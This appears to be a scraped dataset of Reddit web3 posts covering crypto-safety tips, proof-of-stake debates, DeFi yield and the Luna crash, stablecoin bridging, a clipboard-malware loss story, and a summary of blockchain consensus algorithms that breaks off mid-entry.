"How to Avoid the Biggest Crypto Scams and Blunders, for Dummies :)","unfortunate things not only happen to the new and naive (""dummies"") in web3, but also to those who are experienced and may have had an unfortunate lapse in judgement, even me. make sure that you're always on your guard and skeptical. we hope this guide will help protect you and recommend you to go through it thoroughly. 1. **download your web3/solana wallet from the correct source**. a lot of scams will slightly alter the names of sites and make a fake copy site which is easily overlooked. cross verify the site's website/app domain on the twitter account (check for large follower count, and even in this case, make sure it's spelled correctly as there are fake large twitter accounts sometimes too) and in the app store (also should have large number of downloads typically). sometimes twitter accounts even get hacked and they will post fake scam links out of the blue, so make sure you're double checking everything and looking for signs of sketchiness. 2. **never share your wallet seed phrase with anyone!** sharing your seed phrase will give other people access and control over your funds. the only situation where it might be useful is if you want to share the seed phrase with a close family member or friend for backup purposes and safekeeping (be careful with this too, since they might not store your info securely). do not store the seed phrases somewhere others might find easily (i.e. pic on your phone or desktop), use a password manager, split seed phrases into multiple locations, etc. just be careful to not forget where you hide/store your seed phrases. document where you are storing things so if you come back a year later you know how to find this info. remember that if you store a seed phrase on your computer and you don't have it backed up somewhere (i.e. password manager) and your computer completely dies, you're screwed. 3. **use a password manager and 2 factor authentication where you can.** with passwords you want to store them securely and not in places where others can access easily. sim swap hacks often occur for 2 factor authentication systems, so other forms of 2 auth are recommended, such as google authenticator. you should be using this even for your social media accounts. if someone hacks you and tries to scam other people, that would suck to be held liable for. 4. **use a hot wallet system!** have a ""cold"" wallet that you don't connect to any apps and which you use to store the majority of your funds. this means that you should have separate ""hot"" wallets that you use to connect to apps with lesser amounts of funds, and your cold wallet never interacts with apps and stores larger amounts. this is somewhat analogous to a savings/checking system where your cold wallet is your savings account and your hot wallet is your debit/credit card that you buy things with. from your cold wallet you can transfer larger amounts to your hot wallets on demand, but otherwise your hot wallets should only store smaller amounts that wouldn't leave you in tears if hacked. oftentimes people will buy a hardware wallet to use as a cold wallet, but if you don't have one for some reason, most major solana wallets support having multiple wallet addresses when you login, which means you can make one address which you don't use to interact with apps and you can use other hot wallet(s) which store lesser amount of funds and you use to interact with apps. even with cold wallets it is good practice to spread around your funds across multiple places... if you somehow lose access to that specific cold wallet, you don't want to be screwed, so you can mitigate the impact by distributing your funds across different cold wallets, wallet providers, or even centralized exchanges. i personally keep most of my funds on chain but also keep some on coinbase to distribute the risks. once you get more comfortable with these things, consider \[leveling up to a multisig\]([https://squads.so/blog/multisig-guide-for-individuals](https://squads.so/blog/multisig-guide-for-individuals)) for some situations. 5. **nft's that magically appear in your wallet are almost always scams!** they typically include links to airdrops, websites, etc. do not click those links and sign any transactions. most wallets allow you to burn them, but you should be fine if you don't go to the sites in these nft's and sign transactions. in general, clicking any airdrop links, or things that sound too good to be true, is dangerous. try searching the solana subreddit or official twitter accounts related to these things for further confirmation, and even then, make sure you are triangulating information from multiple sources when verifying. remember to use a hot wallet when interacting with any of these things even if you've cross verified for the most part. 6. **if you're being shilled a random token or it appears out of the blue in your wallet, it's probably junk.** it's fine to sell it somewhere like https://jup.ag/swap. it may or may not have any value. you can further check https://rugcheck.xyz/ to see what is said about the token and if it has qualities associated with poor token projects. 7. **do not trust people who dm you out of the blue with ""help""**. be extremely skeptical of people offering help if you do not know these people and even if you think you know them, be skeptical of sharing any personal information, never share your seed phrase, etc. sometimes people ""you know"" can have their social media accounts hacked and so they might not even be the person you're speaking with. 8. **send test transactions.** we have seen many reports where people incorrectly type the address and their funds become unrecoverable. sometimes they send to the ""right"" address but it's on another network and is not recoverable. if you are trying to send a token that can be on multiple networks (i.e. usdc on solana, ethereum, etc) make sure the token that you have is being sent on the right crypto rails or you will lose that money. make sure you see that a small test transfer goes through to the address you are sending to when sending significant amounts. also, **copy and paste addresses and double check the beginning and end of the address.** we have seen many reports where people incorrectly type their address, or copy only part of an address, and then send their funds to an unrecoverable address location. some scams even involve making the beginning and end of an address look like a different one but you can tell it's a different address based on the inside of the address being different. 9. **make sure the apps you are using are more ""trustable"", ideally more ""verifiable"".** sometimes i see people asking about apps that appear new and personally appear sketchy to me. like many other things, proceed cautiously and try to verify from other people in the community if the apps seem legit. high twitter follower account for the app can be a good indicator it might be ok (including follows from a lot of well known solana ecosystem members). you can follow a lot of the devs on this [solana dev twitter list](https://twitter.com/i/lists/1655213072062054401) to gauge general social acceptance of certain apps and other community members. even this resource you should try and verify for yourself and not trust me :) apps being ""open-sourced"" (meaning, the code is publicly available and verifiable) is the ideal in crypto and also a good sign. oftentimes you won't have the skills to verify the code yourself, but if it's in the open it increases the probability that people with the skills have tried to verify the quality of the source. apps should also be audited by respected auditing companies --- on solana the major auditing companies include neodyme, sec3, ottersec, madshield, kudelski, halborn, ackee, and trail of bits. the more audits the better. you can use this site to check this and other security features of apps you use [jaboos.simple.ink](https://t.co/cdwohz8eof) 10. **don't put all your eggs in one basket.** web3 apps can suffer major hacks or other issues at times which means you should distribute your risk and not stick a large majority of your funds in a defi protocol, or anything else really. sometimes even l1 blockchains get hacked and the value of their token might go down a lot. spread out your risk. 11. **remember that you're on the internet and sometimes there are scary people.** not including personal information can sometimes protect you from bad people. even posting your transactions and addresses in public you might regret later. be nice to people though even if you think you're anonymous, this is still a community :) 12. **you're on your own!** well, at least most of the time. people can do their best to help you, but ultimately if a scammer takes your money or you send to an address you don't know, that's often it. in the case of a scammer you may be able to contact law enforcement, but the scammers may be in another country where you have no chance to track them down. if you send crypto to a wrong address, sometimes no one is on the other end to send it back to you, and no one can help you in that case, not even the president of the united states if he was your bestie.",193,51,0.99,2023-12-09

What justifies using proof-of-work if proof-of-stake achieves the same result?,"if we assume proof-of-stake is a better consensus mechanism/algorithm\*\*\* than proof-of-work, then how will people justify using proof-of-work chains in the future? i have recently noticed that some people hate crypto, like really hates crypto. the common critique is the energy consumption from pow chains, and these people generally don't even bother to research about the subject more after coming to the conclusion ""cryptocurrency bad because it uses too much energy"". so i've been thinking about what a great pr move it will be for ethereum when they move to pos, and i have a hard time seeing how bitcoiners will be able to justify using proof-of-work to normal people. the consensus mechanism debate is a tough one, and sure there are decent arguments for why proof-of-work can be better than proof-of-stake, but it is reeaaaally far-fetched to think that normal people are going to be able to understand these arguments. they will just point to another blockchain with pos and say ""if they can arrive to consensus with pos, why can't you?"" in this group of ""normal people"" you will also find 90% of politicians. basically, the energy consumption argument is so easy for people to make and it will be sooo easy for politicians to just bash on proof-of-work chains, even if you think they are superior to proof-of-stake ones. what's your thoughts? what would be your arguments for using a proof-of-work chain and how would you explain it to someone who is not into crypto? \*\*\*this is only a assumption for this post, not saying it's definitely the case but from my point of view it seems like it and from what i can see, most distributed computing folks seem to agree.",76,224,0.91,2021-11-18 17:06:16,web3,CryptoTechnology,lapurita,False,144.3

Stable coin staking risks?,what are the main risks in staking stable coins in defi protocols like [yearn.finance](https://yearn.finance/#/vaults) which currently offers 27% apy for usdc and around 40% apy for dai and [anchorprotocol.com](https://app.anchorprotocol.com/earn) which offers around 20% apy on ust? this seems like easy money to me and i'm considering getting a loan at 4% annual interest the size of my yearly salary and investing in it. the risks that come up to my mind are: 1. stable coin price crashes (many people say this might happen to tether) 2. platform is a rug pool or gets hacked how likely do you think these risks are and are there other types of risks? &#x200b; edit 30.01.2022: thanks a million for your advice! after reading almost all of the comments i decided to not take a loan and invest yield farm stable coins! :d,83,211,0.93,2022-01-25 16:17:44,web3,defi,kpacee,False,143.5

ETH Denver Uber Driver,"greetings, i'm an uber driver in denver, we recently held eth denver, a huge conference for our city. i'd like to share my thoughts as an outsider. a passenger asked about my experience with attendees and she found it interesting and asked me to share on this subreddit. firstly, as an uber driver, i always deal with one asshole a day. i'm glad to report that i didn't have a single bad experience with you nerds over the whole week. not a single passive aggressive remark or worse that i would normally get on the daily... namaste. i probably drove a total of 300 different people from the conference. i'm very chatty and am pretty well versed in the space for a seeming outsider. i would say i discovered two types of attendees; career oriented workers and crypto fanatics. career oriented people were interesting but shared the same scepticism i do. they consisted of developers hoping for the best because their career rested upon it. surprisingly a lot admitted big personal losses due to gambling behaviors. i found it weirdly refreshing to share a somewhat embarrassing experience to a complete stranger as a warning. i got the strong impression that they saw crypto as a career path as opposed to a revolutionary technology. fanatics were more interesting. i expected them to share a cult like exuberance, which they did. the difference is the following: i was expecting a call to action, as with all cults, but instead i only received calls to education. i must have spoken to 200 + crypto fanatics, but not one told me what they were working on specifically. no company, specific coin or project was shared, nobody told me to buy x or invest your time in y. the only call to action was: educate yourself in the space, research your interests and think how blockchain could change it, join communities, share your values, find projects that align with your beliefs etc.. are all of you degenerates the reincarnation of the dalai lama or what? haha i must admit the philosophy that was shared is refreshing and it seemed that everyone was trying to 'help me' in an indirect way which i found sweet and non condescending. i've never judged a group of people as weirdly pacifist and revolutionary at the same time, and this gives me unreasonable levels of confidence. after this experience as an outsider, i have come to the conclusion that crypto is an anti-cult, and im in. wish you all the best, satoshi... i mean alex the uber driver &#x200b;",208,19,0.96,2024-03-06 04:09:21,web3,ethereum,maxyboyy,False,142.0

I'm confused about the concept of Seed Phrase (and I will appreciate your help),"please don't attack my ignorance, i'm pretty sure that at least 70% of people involved in crypto don't know this either. **so, the thing is:** i understand that the seed phrase is like the thing. you lose that and you are out of your wallet. very cool, but until now i also thought that the seed phrase is associated with my wallet address, and that i need both pieces to recover access in case i forget the password or just use a new device. * wallet address: jgfedjvyerfvgegwhatever * seed phrase: pizza pasta pesto but now i downloaded trust wallet, and i'm surprised by the fact that i have just one seed phrase for my entire multi wallet account. so, my trust wallet contains multiple addresses, for one, for eth, for bnb... and i only have one seed phrase. **the confusion:** can i really recover my entire multi wallet account by just providing the seed phrase and nothing else? without even knowing what all my wallet addresses are? this seems crazy. like... a bunch of words, contain information about all those addresses? and what's more important... can i take my seed phrase to another multi wallet app and it will also know all my wallet addresses? how is that possible? this makes me wonder, how easy or difficult it would be for a computer to just test some random words and happen to make it into a multi wallet account, since you don't need to know the address or the exact app with which the wallet was created or at least some kind of username. if all of this is just how it works, i guess i don't always have to use a multi wallet app, i can just go to for example the harmony one chrome extension and provide my seed phrase, and it will give me the one wallet i had inside the multi wallet app. but it seems insecure to me. in that case i would make the seed phrase standard at least 10 times longer. i really can't wrap my head around this, and i thank you for any kind of help you may throw at me :)",90,196,0.95,2022-01-08 05:25:20,web3,CryptoTechnology,Will7ech,False,141.9

Luna is now $4 while UST is $0.3,"i was just looking at the crypto chart hoping for the best and i was stunned.. ust is now $0.3 luna is now $4 omg!!! this is so devastating.. thank god i just had 6% of my portfolio allocated for luna with zero ust. i exited my luna position yesterday with 50% loss, that was better than losing it all. i'm blessed that i just lost around a $100. i can't imagine how those who had tens, hundreds of thousands or even millions in ust and luna feel right now. god help you all really. even those insured will struggle to get any money back from the insurance companies who claim to cover depegging. update : luna is now $1.6 😨 update 2: luna is now $0.4 😨😨 update 3: luna is now $0.15 😨😨😨 in crypto remember these rules.. 1. diversify as part of of a larger plan. 2. always invest what you can afford to lose. 3. never take loans or sell your house and go all in. 4. don't invest, till you have paid all cc dues and kept an emergency fund in place. 5. invest in blue-chip, not poop coins. 6. don't be lured by high apys, it's always about the fundamentals . 7. don't shill coins to others if you don't understand them. 8. stay away from anything that smells like ponzi 9. don't invest in defi native coins if you can't handle 99% volatility during bear markets. 10. invest only what would make you sleep peacefully at night.",123,138,0.9,2022-05-11 04:13:42,web3,defi,rabihwaked,False,138.0

Are memecoins fully dependent on Bitcoin?,"in this post i will discuss the effect of the bitcoin price on the price of memecoins, how it is possible to get out of this endless price circle and whether memecoins can do 1000x or so, even when bitcoin is down bad. bitcoin as the largest and most widely known cryptocurrency has an undeniable impact on all other altcoins, both memecoins and large altcoins like ethereum and solana. fluctuations in the price of bitcoin often change investor sentiment and can affect trading behaviour across the entire ecosystem, including memecoins. historical data suggests that memecoins frequently exhibit a high degree of correlation with bitcoin. a nice proof of this can be seen in the last bullrun, when a number of memecoins reached several hundred million market cap, but once bitcoin started to fall, many of them fell to almost zero despite this set trend, we can observe many memecoins that defy this rule and manage to grow even in the bearmarket (or beartrap we have seen in the last month) such as pepe, ponke or yewif. but what's behind the success of these memecoins? i consider the biggest catalyst for success to be these memecoins communities along with the dev/admin team. various features or conveniences of these tokens can also play an important role. as an example, bonk and his bonkbot, which is a buy bot on telegram. to sum it up, while it is evident that bitcoin has an impact on altcoins, their level of dependence is influenced by a number of factors and it is important to note that if the right set of factors come together, memecoin can easily grow even when the rest of the market is down. do you have the same opinion on this?",199,21,0.98,2024-05-06 12:40:52,web3,defi,SeparateReporter6625,False,137.6

Bridge stablecoins to Polygon/Matic while avoiding ETH-fees by going via BSC-network,"hi,i wanted to share my learned lessons learned this weekend trying to do some defi on the polygon-network. note, i am an noob myself, so do your own research and dd and always try with small amount first.in order to avoid high eth-fees, one can swap stablecoins from bsc via xdai to polygon. (note: in normal times a direct swapp (bsc->polygon) via [https://www.xpollinate.io/](https://www.xpollinate.io/) was/would be? possible...however until further notice they removed bsc support).so the following steps worked for me at least: 1. bridge from bsc to xdai with [https://omni.xdaichain.com/bridge](https://omni.xdaichain.com/bridge) for either dai or usdc. very little fees involved here (\~<.1$, no loss in swap) 2. swap to your binance pegged coins (b-usdc,b-dai) to xdai native tokens (wxdai or usdc) via [https://xdai.component.finance/](https://xdai.component.finance/) . this is a swap on the xdai-network, therefor it would be vise to check liquitidy of the pool before swappping. however it seems if you swap for wxdai the rate is rather okay even for ""larger"" numbers. i got 63 b-usdc->62,87 wxdai and simulated 5000b-usdc->4990wxdai. if you change directly to usdc the rate was worse, esp for larger simulations (only 4960usdc). but this might change anyway hourly. 3. if you went for wxdai: unwrap your tokens via [https://app.honeyswap.org/#/swap](https://app.honeyswap.org/#/swap) for xdai. no loss for swap here 4. now with the native xdai/usdc you can use [https://www.xpollinate.io/](https://www.xpollinate.io/) again to finally swap your coins to polygon. as i never bridged from eth to polygon directly, i don't know the exact rates/fees you get. but it looks like this way seems worth it up to a couple of x-thousands $ as the loss is \~21$ for a 5000$ transfer and basically <0.3$ for 100$..given that already only giving permission to spend coins these days is like 5-10$ on eth-mainnet in low fee times.. note: there are free faucets available for poylgon and xdai so that you do not need to bother for the first few transactions: * matic: [https://matic.supply/](https://matic.supply/) \->leave him some tip/donation once you transfered earn some matic to smoothen onboarding for others! * xdai: [https://blockscout.com/xdai/mainnet/faucet](https://blockscout.com/xdai/mainnet/faucet) * xdai: [https://respond.cryptosurvey.market/surveys/qmw3brwbswcgzyxmoyj75nolfwp9a4ur1uhyezbnwuegc1](https://respond.cryptosurvey.market/surveys/qmw3brwbswcgzyxmoyj75nolfwp9a4ur1uhyezbnwuegc1) edit: do not forget to setup your wallet for the different networks before! i did all transactions with metamask - worked like charm &#x200b; edit2: people contacting me to remove this post is hilarious...they are afraid that too many people know how to swap and block everything and prevent them from earning money as apy goes down. the solution should be kept a secret therefore oo i am sorry - i believe the more people know the better! more trading/lp-fees :p",157,69,0.98,2021-05-23 05:32:06,web3,defi,Expensive_Map_384,False,131.60000000000002

Crypto is my drug of choice.,"so i was one of those chumps that used to work 12 hours a day at a job that paid really well that i hated. building pcs was my hobby. then covid did it's thing and i found myself laid off and turning my hobby into a pretend business that became a real business. it's about that time that i noticed my amd shares i had gotten a few years ago had grown a lot and so immediately my risk tolerance increased and i decided to look into mining. well i ""won"" an rtx 3070 on the newegg shuffle and i was off to the races. found nicehash and being new to the whole thing i stuck with it. well as i acquired more cards i started to wonder if i could do more with the btc i was being paid out in and that's when i discovered defi and so i started moving my money to blockfi where it accumulated 6.5% interest. fast forward to today....i have 2gh/s mining operation with solar power and battery backup. dedicated 80amp across 4 quads and a dedicated mini split. i'm making about $100 a day right now and i take all of that and put it into thorswap where it accumulates 25% apy. i also have investments on anchor (ust) wonderland (memo) osmosis (atom/osmo) and crypto.com and of course i still have my amd stock. all this in a little over a year and i didn't know shit and feel like i still don't. all i know is i finally feel happy and free for the first time ever and my wife and i will never have to work for anyone else ever again. we've been very blessed so far and i had lots of self doubts along the way but it's clear to me that this, all that is blockchain, is the future and we're on the ground floor. congrats to all who read this because we're the ones that get to be kings in this new kingdom. a world where everyone has enough and nobody has nothing or too much. a fair and just and decentralized world where governments aren't able to apply so much control over people's finances. i started this to make ends meat but i realized that this was so much more than that and now i want to do my part to use this new technology to reshape the world and try to just make a dent and make a cent. this is incredible it really is. i just wanted to share my journey with all of you and i hope everyone that's in early is prospering and profiting and philantrophing 😉",114,134,0.93,2022-03-26 02:06:25,web3,defi,americunt2,False,131.3

Wen Bull Run?

Don’t fault anyone for trying to shield the youth from earth-shattering grief.,"some of y’all have lashed out at me for urging young guys who made life-changing money to take substantial profits and protect their downside. you are underestimating the psycho-spiritual havoc wrought by giant losses in crypto. i’ve invested in crypto since 2017. i’ve seen friends gain and lose ~millions. it ain’t pretty. look at the historical patterns. the crash will come. time will tell how severe it will be, but it will come. protect life-changing money with great vigilance. take profits. take care. — edit / p.s. for anyone who is curious i’ve sold about 50% of my sol so far. each person has to look at their own context though. i was overexposed to crypto, have a family now, and don’t want most of our life savings in a promising yet volatile asset class that is still substantially speculative. at these levels i think virtually everyone is wise to take out at least 10-20% and pull an additional 10% out with every $20 increase in price.",108,130,0.89,2024-03-17 18:50:52,web3,solana,bashfulkoala,False,125.7

Safe & Effective yield farms?,"hey everyone, i am trying to get into yield farming almost full time at this point, and i am wondering if anyone has any good recommendations for new farms built on safe platforms with high apys and tvls. the only real major risk i feel like i am facing when expanding my group of farms is finding one that is a rug pull or the project is so early that its coins and all associated projects might just wither out and die. i know of a couple people who were in deep on autofarm because they offered like literal trillions in apy (which should have already been an indicator of risk) and they lost most of what they had. other farms that offer their native token as a reward for liquidity pairs are also minting insane amounts of coins per day. pantherswap mints 2.1 million of their tokens per day. im in on ref finance and wannaswap for high apy farming because they’re both on near protocol and i just a majority of the coins in their ecosystem and farm the ones i think are strong. i want to branch into other communities that have similarly strong farms that maintain high apys (80-200%). please let me know what projects you guys have found reliable! thanks",136,85,0.97,2021-12-28 14:10:19,web3,defi,lambcasters,False,125.3

How I got scammed - PLEASE READ AND BE CAREFUL,"had about $600 in bovada and decided to withdraw to my eth wallet. i copied my ethereum address from coinbase and emailed it to myself on my iphone. in my web browser, i copy pasted the eth address to bovada and 15 minutes later it said complete. i didn't see it in my eth wallet though (didnt thinking anything of it) and decided to go to bed. the next morning i still didnt see it and got worried. i checked the address i sent it to and it was a different eth address. i panicked and asked myself how that was even possible. turns out i have a malware on my laptop and when i copied my eth address, it pastes as a completely different eth address. since the withdrawal was complete, im shit out of luck. let this be a lesson to all, always double and triple check your crypto addresses when sending and receiving. i've done the deposit and withdrawl many times but was stupid and didnt bother to check the addresses this time. paid $625 for a lesson in crytop. going to take my laptop to a repair shop and fix it. if you guys have any words of encouragement for me i would greatly appreciate it",132,94,0.84,2024-03-11 12:54:25,web3,ethereum,Messithegoat24,False,125.20000000000002

"vitalik's take on blockchain technology in voting systems - ""Blockchain voting is overrated among uninformed people but underrated among informed people""","https://vitalik.ca/general/2021/05/25/voting2.html this paper looks at the usecase of blockchain for the purpose of voting. blockchains provide two key properties: correct execution and censorship resistance. but voting also requires some crucial properties that blockchains do not provide: - privacy: you should not be able to tell which candidate some specific voted for, or even if they voted at all - coercion resistance: you should not be able to prove to someone else how you voted, even if you want to . coercion resistance is a particulalry interesting one. ive always thought blockchain is great for voting but it requires the property of privacy. this could be done with zksnarks but then how can you ensure you were not coerced into voting one way or the other? the paper goes into that. and looks at ideas that predated blockchain in electronic systems. if you are interested in blockchain being used in voting, this is also a good paper. it was co authored by max kaye (worked on original ethereum team) and nathan spataro. this paper looks at how blockchain based voting can create a new type of democracy. vitalik breifly mentioned in the first paper that more voting is better but didnt say why. this paper can expand on that.

My brief observation of most common Consensus Algorithms,"i have studied most common consensus algorithms. here is the summary, maybe for someone it will be helpful. my goal is to describe every specific consensus briefly so everyone can easily understand it. *please let me know if i have wrote something wrong, or maybe you are aware of interesting algorithm, i have missed. [proof of work] - very short, cuz it's well-known. [1] bitcoin - to generate a new block miner must generate hash of the new block header that is in line with given requirements. others: ethereum, litecoin etc. [hybrid of pow and pos] [2] decred - hybrid of “proof of work” and “proof of stake”. blocks are created about every 5 minutes. nodes in the network looking for a solution with a known difficulty to create a block (pow). once the solution is found it is broadcast to the network. the network then verifies the solution. stakeholders who have locked some dcr in return for a ticket* now have the chance to vote on the block (pos). 5 tickets are chosen pseudo-randomly from the ticket pool and if at least 3 of 5 vote ‘yes’ the block is permanently added to the blockchain. both miners and voters are compensated with dcr : pos - 30% and pow - 60% of about 30 new decred issued with a block. * 1 ticket = ability to cast 1 vote. stakeholders must wait an average of 28 days (8,192 blocks) to vote their tickets. [proof of stake] [3] nxt - the more tokens are held by account, the greater chance that account will earn the right to generate a block. the total reward received as a result of block generation is the sum of the transaction fees located within the block. three values are key to determining which account is eligible to generate a block, which account earns the right to generate a block, and which block is taken to be the authoritative one in times of conflict: base target value, target value and cumulative difficulty. each block on the chain has a generation signature parameter. to participate in the block's forging process, an active account digitally signs the generation signature of the previous block with its own public key. this creates a 64-byte signature, which is then hashed using sha256. the first 8 bytes of the resulting hash are converted to a number, referred to as the account hit. the hit is compared to the current target value(active balance). if the computed hit is lower than the target, then the next block can be generated. [4] peercoin (chain-based proof of stake) - coin age parameter. hybrid pow and pos algorithm. the longer your peercoins have been stationary in your account (to a maximum of 90 days), the more power (coin age) they have to mint a block. the act of minting a block requires the consumption of coin age value, and the network determines consensus by selecting the chain with the largest total consumed coin age. reward - minting + 1% yearly. [5] reddcoin (proof of stake velocity) - quite similar to peercoin, difference: not linear coin-aging function (new coins gain weight quickly, and old coins gain weight increasingly slowly) to encourage nodes activity. node with most coin age weight have a bigger chance to create block. to create block node should calculate right hash. block reward - interest on the weighted age of coins/ 5% annual interest in posv phase. [6] ethereum (casper) - uses modified bft consensus. blocks will be created using pow. in the casper phase 1 implementation for ethereum, the “proposal mechanism"" is the existing proof of work chain, modified to have a greatly reduced block reward. blocks will be validated by set of validators. block is finalised when 2/3 of validators voted for it (not the number of validators is counted, but their deposit size). block creator rewarded with block reward + transaction fees. [7] lisk (delegated proof-of-stake) - lisk stakeholders vote with vote transaction (the weight of the vote depends on the amount of lisk the stakeholder possess) and choose 101 delegates, who create all blocks in the blockchain. one delegate creates 1 block within 1 round (1 round contains 101 blocks) -> at the beginning of each round, each delegate is assigned a slot indicating their position in the block generation process -> delegate includes up to 25 transactions into the block, signs it and broadcasts it to the network -> as >51% of available peers agreed that this block is acceptable to be created (broadhash consensus), a new block is added to the blockchain. *any account may become a delegate, but only accounts with the required stake (no info how much) are allowed to generate blocks. block reward - minted lisks and transaction fees (fees for all 101 blocks are collected firstly and then are divided between delegates). blocks appears every 10 sec. [8] cardano (ouroboros proof of stake) - blocks(slots) are created by slot leaders. slot leaders for n epoch are chosen during n-1 epoch. slot leaders are elected from the group of ada stakeholders who have enough stake. election process consist of 3 phases: commitment phase: each elector generates a random value (secret), signs it and commit as message to network (other electors) saved in to block. -> reveal phase: each elector sends special value to open a commitment, all this values (opening) are put into the block. -> recovery phase: each elector verifies that commitments and openings match and extracts the secrets and forms a seed (randomly generated bytes string based on secrets). all electors get the same seed. -> follow the satoshi algorithm : elector who have coin which corresponded to seed become a slot leader and get a right to create a block. slot leader is rewarded with minted ada and transactions fee. [9] tezos (proof of stake) - generic and self-amending crypto-ledger. at the beginning of each cycle (2048 blocks), a random seed is derived from numbers that block miners chose and committed to in the penultimate cycle, and revealed in the last. -> using this random seed, a follow the coin strategy (similar to follow the satoshi) is used to allocate mining rights and signing rights to stakeholders for the next cycle*. -> blocks are mined by a random stakeholder (the miner) and includes multiple signatures of the previous block provided by random stakeholders (the signers). mining and signing both offer a small reward but also require making a one cycle safety deposit to be forfeited in the event of a double mining or double signing. * the more coins (rolls) you have - the more your chance to be a miner/signer. [10] tendermint (byzantine fault tolerance) - a proposal is signed and published by the designated proposer at each round. the proposer is chosen by a deterministic and non-choking round robin selection algorithm that selects proposers in proportion to their voting power. the proposer create the block, that should be validated by >2/3 of validators, as follow: propose -> prevote -> precommit -> commit. proposer rewarded with transaction fees. [11] tron (byzantine fault tolerance) - this blockhain is still on development stage. consensus algorithm = pos + bft (similar to tendermint): pos algorithm chooses a node as proposer, this node has the power to generate a block. -> proposer broadcasts a block that it want to release. -> block enters the prevote stage. it takes >2/3 of nodes' confirmations to enter the next stage. -> as the block is prevoted, it enters precommit stage and needs >2/3 of node's confirmation to go further. -> as >2/3 of nodes have precommited the block it's commited to the blockchain with height +1. new blocks appears every 15 sec. [12] neo (delegated byzantine fault tolerance) - consensus nodes* are elected by neo holders -> the speaker is identified (based on algorithm) -> he broadcasts proposal to create block -> each delegate (other consensus nodes) validates proposal -> each delegate sends response to other delegates -> delegate reaches consensus after receiving 2/3 positive responses -> each delegate signs the block and publishes it-> each delegate receives a full block. block reward 6 gas distributed proportionally in accordance with the neo holding ratio among neo holders. speaker rewarded with transaction fees (mostly 0). * stake 1000 gas to nominate yourself for bookkeeping(consensus node) [13] eos (delegated proof of stake) - those who hold tokens on a blockchain adopting the eos.io software may select* block producers through a continuous approval voting system and anyone may choose to participate in block production and will be given an opportunity to produce blocks proportional to the total votes they have received relative to all other producers. at the start of each round 21 unique block producers are chosen. the top 20 by total approval are automatically chosen every round and the last producer is chosen proportional to their number of votes relative to other producers. block should be confirmed by 2/3 or more of elected block producers. block producer rewarded with block rewards. *the more eos tokens a stakeholder owns, the greater their voting power [the xrp ledger consensus process] [14] ripple - each node receives transaction from external applications -> each node forms public list of all valid (not included into last ledger (=block)) transactions aka (candidate set) -> nodes merge its candidate set with unls(unique node list) candidate sets and vote on the veracity of all transactions (1st round of consensus) -> all transactions that received at least 50% votes are passed on the next round (many rounds may take place) -> final round of consensus requires that min 80% of nodes unl agreeing on transactions. it means that at least 80% of validating nodes should have same candidate set of transactions -> after that each validating node computes a new ledger (=block) with all transactions (with 80% unl agreement) and calculate ledger hash, signs and broadcasts -> all validating nodes compare their ledgers hash -> nodes of the network recognize a ledger instance as validated when a 80% of the peers have signed and broadcast the same validation hash. -> process repeats. ledger creation process lasts 5 sec(?). each transaction includes transaction fee (min 0,00001 xrp) which is destroyed. no block rewards. [the stellar consensus protocol] [15] stellar (federated byzantine agreement) - quit similar to ripple. key difference - quorum slice. [proof of burn] [16] slimcoin - to get the right to write blocks node should “burn” amount of coins. the more coins node “burns” more chances it has to create blocks (for long period) -> nodes address gets a score called effective burnt coins that determines chance to find blocks. block creator rewarded with block rewards. [proof of importance] [17] nem - only accounts that have min 10k vested coins are eligible to harvest (create a block). accounts with higher importance scores have higher probabilities of harvesting a block. the higher amount of vested coins, the higher the account’s importance score. and the higher amount of transactions that satisfy following conditions: - transactions sum min 1k coins, - transactions made within last 30 days, - recipient have 10k vested coins too, - the higher account’s important score. harvester is rewarded with fees for the transactions in the block. a new block is created approx. every 65 sec. [proof of devotion] [18] nebulas (proof of devotion + bft) - quite similar to poi, the pod selects the accounts with high influence. all accounts are ranked according to their liquidity and propagation (nebulas rank) -> top-ranked accounts are selected -> chosen accounts pay deposit and are qualified as the blocks validators* -> algorithm pseudo-randomly chooses block proposer -> after a new block is proposed, validators set (each validator is charged a deposit) participate in a round of bft-style voting to verify block (1. prepare stage -> 2. commit stage. validators should have > 2/3 of total deposits to validate block) -> block is added. block rewards : each validator rewarded with 1 nas. *validators set is dynamic, changes in set may occur after epoch change. [iota algorithm] [19] iota - uses dag (directed acyclic graph) instead of blockchain (tangle equal to ledger). graph consist of transactions (not blocks). to issue a new transaction node must approve 2 random other transactions (not confirmed). each transaction should be validate n(?) times. by validating past(2) transactions whole network achieves consensus. in order to issue transaction node: 1. sign transaction with private key 2. choose two other transactions to validate based on mcmc(markov chain monte carlo) algorithm, check if 2 transactions are valid (node will never approve conflicting transactions) 3. make some pow(similar to hashcash). -> new transaction broadcasted to network. node don’t receive reward or fee. [pbft + pow] [20] yobicash - uses pbft and also pow. nodes reach consensus on transactions by querying other nodes. a node asks its peers about the state of a transaction: if it is known or not, and if it is a doublespending transaction or not. as follow : node receives new transaction -> checks if valid -> queries all known nodes for missing transactions (check if already in dag ) -> queries 2/3 nodes for doublepsending and possibility -> if everything is ok add to dag. reward - nodes receive transaction fees + minting coins. [proof of space/proof of capacity] [21] filecoin (power fault tolerance) - the probability that the network elects a miner(leader) to create a new block (it is referred to as the voting power of the miner) is proportional to storage currently in use in relation to the rest of the network. each node has power - storage in use verified with proof of spacetime by nodes. leaders extend the chain by creating a block and propagating it to the network. there can be an empty block (when no leader). a block is committed if the majority of the participants add their weight on the chain where the block belongs to, by extending the chain or by signing blocks. block creator rewarded with block reward + transaction fees. [proof of elapsed time] [22] hyperledger sawtooth - goal - to solve bft validating nodes limitation. works only with intel’s sgx. poet uses a random leader election model or a lottery based election model based on sgx, where the protocol randomly selects the next leader to finalize the block. every validator requests a wait time from an enclave (a trusted function). -> the validator with the shortest wait time for a particular transaction block is elected the leader. -> the blockpublisher is responsible for creating candidate blocks to extend the current chain. he takes direction from the consensus algorithm for when to create a block and when to publish a block. he creates, finalizes, signs block and broadcast it -> block validators check block -> block is created on top of blockchain. [other] [23] byteball (delegated byzantine fault tolerance) - only verified nodes are allowed to be validation nodes (list of requirements https://github.com/byteball/byteball-witness). users choose in transaction set of 12 validating nodes. validating nodes(witnesses) receive transaction fees. [24] nano - uses dag, pow (hashcash). nano uses a block-lattice structure. each account has its own blockchain (account-chain) equivalent to the account’s transaction/balance history. to add transaction user should make some hashcash pow -> when user creates transaction send block appears on his blockchain and receive block appears on recipients blockchain. -> peers in view receive block -> peers verify block (double spending and check if already in the ledger) -> peers achieve consensus and add block. in case of fork (when 2 or more signed blocks reference the same previous block): nano network resolves forks via a balance-weighted voting system where representative nodes vote for the block they observe, as >50% of weighted votes received, consensus achieved and block is retained in the node’s ledger (block that lose the vote is discarded). [25] holochain - 